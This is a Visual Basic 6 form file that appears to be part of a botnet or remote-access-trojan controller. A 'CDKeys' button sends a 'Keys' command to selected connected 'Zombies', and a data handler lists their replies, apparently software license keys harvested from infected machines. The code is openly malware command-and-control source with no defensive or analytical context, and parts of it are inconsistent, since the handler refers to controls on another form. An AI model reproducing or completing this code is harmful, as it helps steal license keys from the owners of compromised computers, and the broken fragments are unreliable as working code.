VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form Form5 
   Caption         =   "Form5"
   ClientHeight    =   4650
   ClientLeft      =   120
   ClientTop       =   420
   ClientWidth     =   6540
   LinkTopic       =   "Form5"
   ScaleHeight     =   4650
   ScaleWidth      =   6540
   StartUpPosition =   3  'Windows Default
   Begin MSWinsockLib.Winsock Winsock1 
      Index           =   0
      Left            =   4680
      Top             =   4080
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox Text1 
      Height          =   4215
      Left            =   120
      TabIndex        =   0
      Text            =   "Text1"
      Top             =   120
      Width           =   6015
   End
End
Attribute VB_Name = "Form5"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub CDKeys_Click()
Dim pckt$
sent = 0
For i = 1 To Form1.ListView1.ListItems.Count
If Form1.ListView1.ListItems.Item(i).Selected = True Then
pckt$ = "Keys"
If Form1.Zombies(i).State = 7 Then
Form1.Zombies(i).SendData pckt$
sent = sent + 1
Form1.ListView1.ColumnHeaders(2).text = "Status (" & sent & " Commands Sent)"


End If
End If
DoEvents
Next i
End Sub

Private Sub Winsock1_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Zombies(Index).GetData data(Index)
Debug.Print data(Index)
Dim i As Integer
 For i = 1 To ListView1.ListItems.Count
 Dim x As Integer
 For x = 1 To ListView1.ListItems.Count
 If Index = Split(ListView1.ListItems.Item(x).text, "k ")(0) Then
  If InStr(data(Index), " b ") Then
  ListView1.ListItems.Item(x).SubItems(1) = Split(data(Index), " b ")(0)
  ListView1.ListItems.Item(x).SubItems(2) = Split(data(Index), " k ")(1)
    Else
  ListView1.ListItems.Item(x).SubItems(1) = data(Index)
  End If
  
  End If
  Next x
  
  Exit Sub
 Next i
End Sub

